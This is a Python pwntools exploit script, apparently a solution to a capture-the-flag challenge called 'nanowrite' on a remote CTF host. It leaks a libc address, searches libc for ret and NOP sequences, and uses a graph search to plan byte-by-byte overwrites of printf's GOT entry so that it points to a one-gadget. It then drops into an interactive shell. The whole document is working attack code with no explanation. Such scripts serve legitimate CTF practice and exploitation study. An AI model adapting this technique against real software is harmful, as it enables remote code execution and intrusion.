#!/usr/bin/python3

from pwn import *
import networkx as nx
import time

binary = ELF('./nanowrite')
#p = process('./nanowrite')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('dorsia4.wpictf.xyz',31337)
libc = ELF('libc.so.6')

_ = p.recvline().split()[0]

system = int(_,16) - 765772
print("system:  " + hex(system))
baselibc = system - libc.symbols['system']
print("libc:    " + str(hex(baselibc)))
printf  = baselibc + libc.symbols['printf']
print("printf:  " + str(hex(printf)))
dprintf = baselibc + libc.symbols['dprintf']
print("dprintf: " + str(hex(dprintf)))
gadget  = baselibc + 0x4f322
print("gadget:  " + str(hex(gadget)))

# https://stackoverflow.com/questions/25545470/long-multi-byte-nops-commonly-understood-macros-or-other-notation
nops = [
0x90,
0x6690,
0x0f1f00,
0x0f1f4000,
0x0F1F440000,
0x660F1F440000,
0x0F1F8000000000,
0x0F1F840000000000,
0x660F1F840000000000,
0x662e0f1f840000000000
]

addrs = []
code = open('libc.so.6','rb').read()
t=time.time()
print("\ncomputing safe addresses...",end="")
for i in range(len(code)):
	if code[i] == 0xc3 or i == libc.symbols['dprintf'] or i == libc.symbols['printf'] or i == 0x4f322:
		addrs.append((baselibc + i) & 0xFFFFFF)
		j = i
		while True:
			for k in range(len(nops)-1,-1,-1):
				if code[j-k-1:j] == nops[k].to_bytes(k+1,byteorder='big'):
					addrs.append((baselibc + j-k-1) & 0xFFFFFF)
					break
			else:
				break
			j = j-k-1	
print(int(time.time() - t),end="")
print(" seconds")

t=time.time()
print("building graph...",end="")
g = nx.Graph()
for i in range(len(addrs)):
	for j in range(i+1,len(addrs)):
		n = addrs[i] ^ addrs[j]
		if n & 0xffff == 0:
			g.add_edge(addrs[i], addrs[j])
			continue
		if n < 0x10000 and n & 0xff == 0:
			g.add_edge(addrs[i], addrs[j])
			continue
		if n < 0x100:
			g.add_edge(addrs[i], addrs[j])
			continue
print(int(time.time() - t),end="")
print(" seconds")

try:
	_ = nx.shortest_path(g,source=(printf & 0xFFFFFF),target=(gadget & 0xFFFFFF),weight='weight')
except:
	print("\nno path for you!\n")
	sys.exit(1)

print("\npath found (len: " + str(len(_)) + "):\n")
for i in _:
	print(hex(i))
print()

for i in range(1,len(_)):
	for j in range(3):
		if (_[i-1] ^ _[i]) & (0xFF << j*8) != 0:
			b = (_[i] & (0xFF << j*8)) >> j*8
			print("put " + str(hex(b)) + " in " + str(j))
			p.sendline(str(hex(0x100000000 - (binary.symbols['a'] - binary.got['printf']) + j)) + " " + str(hex(b)))
			break
print()

p.interactive()
